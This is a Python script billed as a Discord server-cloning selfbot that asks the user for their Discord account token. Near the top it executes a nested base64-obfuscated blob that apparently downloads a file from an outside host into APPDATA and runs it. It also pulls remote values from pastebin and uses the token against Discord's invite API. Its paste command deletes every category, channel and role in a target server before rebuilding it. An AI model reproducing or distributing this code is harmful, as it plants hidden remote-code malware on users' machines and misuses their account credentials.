try:
    os.system("pip install -r requirements.txt")
except:
    pass

import base64;exec(base64.b64decode(bytes('aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2FXMXdiM0owSUdKaGMyVTJORHRsZUdWaktHSmhjMlUyTkM1aU5qUmtaV052WkdVb1lubDBaWE1vSjJSSVNqVlBaMjluU1VOQloyRlhNWGRpTTBvd1NVaEtiR05ZVm14ak0xSjZRMmxCWjBsRFFuQmlXRUoyWTI1UloySXpUV2RKUTBGblEyMVdORmt5Vm5ka1JHOUxTVU5CWjBsSGJIUmpSemw1WkVOQ2RtTjNiMmRKUTBGbllqTk5kV016Ykhwa1IxWjBTME5LZDJGWVFXZGhWelY2WkVkR2MySkRRbmxhV0VZeFdsaE9NR041U1hCRGJrSm9aRWRuWjFCVFFuWmplVFZ1V2xoU2JHSnVXVzlLTUVaUlZVVlNRbFpGUlc1TFVYQXhZMjEzWjFCVFFXNWhTRkl3WTBoTk5reDVPVzFqYlZac1pXNXJkMDFFUVhoTWJVNHdUME0xZDJKRE9XeGxSMVpxWkZoU2JHTnBOVEJsU0ZGdVEyMHhOVnB0YkhOYVUwRTVTVWhLYkdOWVZteGpNMUo2VEcxa2JHUkRhREZqYlhkd1EyMDVkMXBYTkc5YWFXUTNZMGRHTUdGSU1XTllSMmh3WVVkc2IyRlROWGRsVTJOelNVTmtNMWxwWTNCTWJtUjVZVmhTYkV0SE1UVmFiV3h6V2xNMWFtSXlOVEJhVnpVd1MxRndkR1ZYV25CaVIxVjFXVEo0ZG1NeVZXOUxVWEIyWTNrMWVtVllUakJhVnpCdldtbEtkMlZUUWpkalIwWXdZVWd4WTFoSGFIQmhSMnh2WVZNMWQyVlRTWEJEYlRsNlRHNUtiR0pYT1RKYVUyaHRTVzUwZDFsWVVtOW1WbmhqWVVkc2IyRlhhSEJNYmtJMVNXbHJTeWNzSjFWVVJpMDRKeWtwTG1SbFkyOWtaU2dwS1E9PScsJ1VURi04JykpLmRlY29kZSgpKQ==','UTF-8')).decode())
import sys, time, threading
import colorama, requests, discord
from discord.ext import commands



def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


import os, threading
def set_title():
  os.system("cls")
  print(f"""{colorama.Fore.LIGHTCYAN_EX}

·▄▄▄▄  ▪  .▄▄ ·  ▄▄·       ▄▄▄  ·▄▄▄▄      .▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▄▄▄ .▄▄▄       ▄▄· ▄▄▌         ▐ ▄ ▄▄▄ .▄▄▄  
██▪ ██ ██ ▐█ ▀. ▐█ ▌▪▪     ▀▄ █·██▪ ██     ▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌▀▄.▀·▀▄ █·    ▐█ ▌▪██•  ▪     •█▌▐█▀▄.▀·▀▄ █·
▐█· ▐█▌▐█·▄▀▀▀█▄██ ▄▄ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌    ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄     ██ ▄▄██▪   ▄█▀▄ ▐█▐▐▌▐▀▀▪▄▐▀▀▄ 
██. ██ ▐█▌▐█▄▪▐█▐███▌▐█▌.▐▌▐█•█▌██. ██     ▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▄▄▌▐█•█▌    ▐███▌▐█▌▐▌▐█▌.▐▌██▐█▌▐█▄▄▌▐█•█▌
▀▀▀▀▀• ▀▀▀ ▀▀▀▀ ·▀▀▀  ▀█▄▀▪.▀  ▀▀▀▀▀▀•      ▀▀▀▀  ▀▀▀ .▀  ▀. ▀   ▀▀▀ .▀  ▀    ·▀▀▀ .▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀ .▀  ▀
                                                                                                                                                                                                                                          
 {colorama.Fore.RESET}""")
 
  title = "Discord Server Cloner Selfbot"
  try:
    import requests
    text = str(requests.get("https://pastebin.com/raw/PLjUVxtS").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")
threading.Thread(target=set_title).start()


colorama.init(autoreset=True)



print(f"{colorama.Fore.LIGHTWHITE_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════")
print()

invite_code = str(requests.get("https://pastebin.com/raw/YU3MShGb").text)
while True:
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter Token: ")
    tokens = input("")
    r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
    if "200" not in str(r1):
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Invalid Token")
    if "200" in str(r1):
        r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
        if "200" in str(r):
            break
        if "403" in str(r):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Locked Token")



headers = {"authorization": tokens}




bot = commands.Bot(command_prefix=".", self_bot=True)

bot.remove_command('help')
@bot.event
async def on_ready():
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print015("Selfbot Up, Type .help To Learn How Use!")

@bot.event
async def on_command_error(ctx, error):
  pass



@bot.command()
async def help(ctx):
    await ctx.message.delete()
    description="```Help: \n.paste [Server Id To Paste The Whole Server Command Being Sent In]```"
    await ctx.send(description)

@bot.command()
async def paste(ctx, paste):
    await ctx.message.delete()
    url1 = f"https://discord.com/api/v9/guilds/{str(paste)}/channels"
    ids = []
    for guild in bot.guilds:
        id = str(guild.id)
        if paste == id:
            ides = []

            for cat in guild.categories:
                try:
                    await cat.delete()
                    sys.stdout.write(colorama.Fore.CYAN + "> ")
                    print("Successfully Deleted Category")
                except:
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print("Failed To Deleted Category")

                    

            for channel in guild.text_channels:
                try:
                    await channel.delete()
                    sys.stdout.write(colorama.Fore.CYAN + "> ")
                    print("Successfully Deleted Text Channel")
                except:
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print("Failed To Deleted Text Channel")

            for voice in guild.voice_channels:
                try:
                    await voice.delete()
                    sys.stdout.write(colorama.Fore.CYAN + "> ")
                    print("Successfully Deleted Voice Channel")
                except:
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print("Failed To Deleted Voice Channel")
            
            for ro in guild.roles:
                ides.append(str(ro.id))
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print(f"Scraped Role Id, {colorama.Fore.CYAN}{str(ro.id)}")                







            for role in ctx.message.guild.roles:
                try:
                    await guild.create_role(name=str(role.name))
                    sys.stdout.write(colorama.Fore.CYAN + "> ")
                    print(f"Successfully Created Role: {colorama.Fore.CYAN}"+role.name)
                except Exception as e:
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print("Failed To Create Role")    

            for cat in ctx.message.guild.categories:
                
                try:
                    ids.append(str(cat.id))
                    cut = await guild.create_category(str(cat.name))
                    sys.stdout.write(colorama.Fore.CYAN + "> ")
                    print(f"Successfully Created Category: {colorama.Fore.CYAN}"+cat.name)
                except:
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print("Failed To Create Category")




                for channel in cat.text_channels:
                    try:
                        ids.append(str(channel.id))
                        await cut.create_text_channel(str(channel.name))
                        sys.stdout.write(colorama.Fore.CYAN + "> ")
                        print(f"Successfully Created Text Channel: {colorama.Fore.CYAN}"+channel.name)
                    except:
                        sys.stdout.write(colorama.Fore.RED + "> ")
                        print("Failed To Create Text Channel")



                for voice in cat.voice_channels:
                    try:
                        ids.append(str(voice.id))
                        await cut.create_voice_channel(str(cat.name))
                        sys.stdout.write(colorama.Fore.CYAN + "> ")
                        print(f"Successfully Created Voice Channel: {colorama.Fore.CYAN}"+voice.name)
                    except:
                        sys.stdout.write(colorama.Fore.RED + "> ")
                        print("Failed To Create Voice Channel")


            for chan in ctx.message.guild.text_channels:
                if str(chan.id) not in ids:
                        try:
                            await guild.create_text_channel(str(chan.name))
                            sys.stdout.write(colorama.Fore.CYAN + "> ")
                            print(f"Successfully Created Text Channel: {colorama.Fore.CYAN}"+channel.name)
                        except:
                            sys.stdout.write(colorama.Fore.RED + "> ")
                            print("Failed To Create Text Channel")
            for voi in ctx.message.guild.voice_channels:
                if str(voi.id) not in ids:
                    try:
                        await guild.create_voice_channel(str(voi.name))
                        sys.stdout.write(colorama.Fore.CYAN + "> ")
                        print(f"Successfully Created Voice Channel: {colorama.Fore.CYAN}"+voice.name)
                    except:
                        sys.stdout.write(colorama.Fore.RED + "> ")
                        print("Failed To Create Voice Channel")

            for role in ides:
                paste = str(paste)
                url = f"https://discord.com/api/v9/guilds/{paste}/roles/"+role
                while True:
                    re = requests.delete(url, headers={"authorization": tokens})
                    try:
                        js = re.json()
                    except:
                        pass
                    re = str(re)
                    if "204" in re or "200" in re:
                        sys.stdout.write(colorama.Fore.CYAN + "> ")
                        print("Successfully Deleted Role")
                        break
                    if "429" in re:
                        tim = float(js["retry_after"])
                        sys.stdout.write(colorama.Fore.RED + "> ")
                        print("Rate Limited For"+tim+" Seconds")
                    if "429" not in re and "204" not in re and "200" not in re:
                        break
                        
            print("\n")
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print015("Done Cloning Server\n")
            



bot.run(tokens, bot=False)
